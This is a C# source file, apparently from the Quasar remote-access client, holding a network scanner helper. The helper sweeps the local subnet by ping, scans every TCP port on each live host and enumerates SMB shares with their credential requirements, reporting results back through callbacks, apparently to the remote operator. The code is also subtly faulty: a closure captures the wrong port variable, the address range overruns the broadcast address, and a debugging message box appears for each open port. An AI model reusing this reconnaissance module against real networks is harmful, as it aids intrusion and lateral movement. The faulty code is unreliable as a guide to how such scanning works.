using Quasar.Common.Messages.Network;
using Quasar.Common.Models.Network;
using Quasar.Common.Networking;
using System.Management;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System;
using System.Threading.Tasks;
using Quasar.Client.Networking;
using System.Threading;
using System.Security.Principal;
using System.Windows.Forms;

namespace Quasar.Client.Helper.Network
{
    public static class ScannerHelper
    {
        public static List<InterfaceEntity> GetInterfaces()
        {
            List<InterfaceEntity> interfaceResults = new List<InterfaceEntity>();
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nic in interfaces)
            {
                string macAddress = nic.GetPhysicalAddress().ToString();
                InterfaceEntity entity = new InterfaceEntity { Name = nic.Name, MAC = macAddress };
                interfaceResults.Add(entity);
            }
            return interfaceResults;
        }

        public static int CalculateTotalPotentialIPs(InterfaceEntity entity)
        {
            string normalizedMac = entity.MAC.Replace(":", "").Replace("-", "").ToUpper();
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            NetworkInterface nic = interfaces.FirstOrDefault(card => card.GetPhysicalAddress().ToString().ToUpper() == normalizedMac);

            if (nic == null)
                return 0;

            var ipProps = nic.GetIPProperties();
            var unicastAddresses = ipProps.UnicastAddresses.Where(ua => ua.Address.AddressFamily == AddressFamily.InterNetwork);
            int totalPotentialIPs = 0;
            foreach (var unicast in unicastAddresses)
            {
                IPAddress ipAddress = unicast.Address;
                IPAddress subnetMask = unicast.IPv4Mask;

                if (subnetMask == null)
                    continue;

                IPAddress networkAddress = GetNetworkAddress(ipAddress, subnetMask);
                IPAddress broadcastAddress = GetBroadcastAddress(ipAddress, subnetMask);

                uint networkUint = IpToUint(networkAddress);
                uint broadcastUint = IpToUint(broadcastAddress);
                if (broadcastUint > networkUint + 1)
                {
                    int usable = (int)(broadcastUint - networkUint - 1);
                    totalPotentialIPs += usable;
                }
            }
            return totalPotentialIPs;
        }

        public static void ScanInterfaceAction(InterfaceEntity entity, Action<DoNetworkScanResponse> action, Action<DoNetworkScanProgress> progress)
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            string normalizedMac = entity.MAC.Replace(":", "").Replace("-", "").ToUpper();
            NetworkInterface targetInterface = interfaces
                .FirstOrDefault(nic => nic.GetPhysicalAddress().ToString().ToUpper() == normalizedMac);
            int totalInterfaces = interfaces.Count();
            int targetInterfaceIndex = Array.IndexOf(interfaces, targetInterface);

            if (targetInterface == null)
            {
                return; // Interface Not Found
            }

            var ipProps = targetInterface.GetIPProperties();
            var unicastAddresses = ipProps.UnicastAddresses.Where(ua => ua.Address.AddressFamily == AddressFamily.InterNetwork);

            // Thread limiter for port scanning
            SemaphoreSlim portSemaphore = new SemaphoreSlim(250);

            foreach (var unicast in unicastAddresses)
            {
                IPAddress ipAddress = unicast.Address;
                IPAddress subnetMask = unicast.IPv4Mask;

                if (subnetMask == null)
                {
                    return; // Subnet Not Found
                }

                IPAddress networkAddress = GetNetworkAddress(ipAddress, subnetMask);
                IPAddress broadcastAddress = GetBroadcastAddress(ipAddress, subnetMask);

                uint start = IpToUint(networkAddress) + 1;
                uint end = IpToUint(broadcastAddress) + 1;

                List<IPAddress> ipList = new List<IPAddress>();
                for (uint current = start; current <= end; current++)
                {
                    ipList.Add(UintToIp(current));
                }
                int totalIps = ipList.Count;

                ParallelOptions ipScanOptions = new ParallelOptions
                {
                    MaxDegreeOfParallelism = 5
                };
                int remainingIps = totalIps;
                Parallel.ForEach(ipList, ipScanOptions, currentIp =>
                {
                    Interlocked.Decrement(ref remainingIps);
                    // targetInterfaceIndex must be 1-indexed for math reasons
                    DoNetworkScanProgress report = new DoNetworkScanProgress { NetworkInterfaces = totalInterfaces, InterfaceIndex = targetInterfaceIndex, Addresses = totalIps, CurrentAddress = remainingIps };
                    progress(report);
                    using (Ping ping = new Ping())
                    {
                        try
                        {
                            PingReply reply = ping.Send(currentIp, 1000);
                            if (reply.Status != IPStatus.Success)
                            {
                                return;
                            }
                        }
                        catch
                        {
                            return;
                        }
                    }
                    AddressEntity networkEntity = new AddressEntity { InterfaceIndex = targetInterfaceIndex, Address = currentIp.ToString(), Ports = new int[] { }, Shares = new ShareEntity[] { } };
                    DoNetworkScanResponse packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
                    action(packet);
                    List<int> ports = new List<int>();
                    List<Task> portTasks = new List<Task>();
                    for (int port = 1; port < 65535; port++)
                    {
                        int currentPort = port;
                        portTasks.Add(Task.Run(async () =>
                        {
                            await portSemaphore.WaitAsync();
                            try
                            {
                                progress(new DoNetworkScanProgress
                                {
                                    NetworkInterfaces = totalInterfaces,
                                    InterfaceIndex = targetInterfaceIndex,
                                    Addresses = totalIps,
                                    CurrentAddress = remainingIps,
                                    ScanningPorts = true,
                                    ScanningShares = false,
                                    CurrentPort = currentPort,
                                    NIC = entity,
                                    Address = networkEntity
                                });
                                if (IsPortOpen(currentIp, port, 500))
                                { 
                                    lock (ports)
                                    {
                                        ports.Add(port);
                                    }
                                    networkEntity.Ports = ports.ToArray();
                                    DoNetworkScanResponse portPacket = new DoNetworkScanResponse
                                    {
                                        Result = true,
                                        FailureReason = "",
                                        Address = networkEntity,
                                        Interface = entity
                                    };
                                    MessageBox.Show($"{currentIp} Found Port {port}");
                                    action(portPacket);
                                }
                            }
                            finally
                            {
                                portSemaphore.Release();
                            }
                        }));
                    }
                    Task.WaitAll(portTasks.ToArray());
                    networkEntity.Ports = ports.ToArray();
                    packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
                    action(packet);
                    report.ScanningPorts = false;
                    report.ScanningShares = true;
                    progress(report);
                    List<ShareEntity> shares = new List<ShareEntity>();
                    SMBHelper.GetSMBSharesWithCredentialInfo(currentIp.ToString(), (share) =>
                    {
                        ShareEntity shareEntity = new ShareEntity
                        {
                            ShareName = share.ShareName,
                            ShareType = share.ShareType,
                            Remark = share.Remark,
                            RequiresCredentials = share.RequiresCredentials
                        };
                        shares.Add(shareEntity);
                        networkEntity.Shares = shares.ToArray();
                        packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
                        action(packet);
                    });
                    networkEntity.Shares = shares.ToArray();
                    packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
                    action(packet);
                    report.ScanningShares = false;
                });
            }
        }

        private static uint IpToUint(IPAddress ip)
        {
            byte[] bytes = ip.GetAddressBytes();
            if (BitConverter.IsLittleEndian)
                Array.Reverse(bytes);
            return BitConverter.ToUInt32(bytes, 0);
        }

        private static IPAddress UintToIp(uint ipUint)
        {
            byte[] bytes = BitConverter.GetBytes(ipUint);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(bytes);
            return new IPAddress(bytes);
        }

        private static IPAddress GetNetworkAddress(IPAddress address, IPAddress subnet)
        {
            byte[] ipBytes = address.GetAddressBytes();
            byte[] maskBytes = subnet.GetAddressBytes();
            byte[] networkBytes = new byte[ipBytes.Length];

            for (int i = 0; i < ipBytes.Length; i++)
            {
                networkBytes[i] = (byte)(ipBytes[i] & maskBytes[i]);
            }

            return new IPAddress(networkBytes);
        }

        private static IPAddress GetBroadcastAddress(IPAddress address, IPAddress subnet)
        {
            byte[] ipBytes = address.GetAddressBytes();
            byte[] maskBytes = subnet.GetAddressBytes();
            byte[] broadcastBytes = new byte[ipBytes.Length];

            for (int i = 0; i < ipBytes.Length; i++)
            {
                broadcastBytes[i] = (byte)(ipBytes[i] | (~maskBytes[i]));
            }

            return new IPAddress(broadcastBytes);
        }

        private static bool IsPortOpen(IPAddress address, int port, int timeout)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    IAsyncResult result = client.BeginConnect(address, port, null, null);
                    bool success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds(timeout));
                    if (!success)
                        return false;
                    client.EndConnect(result);
                }
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
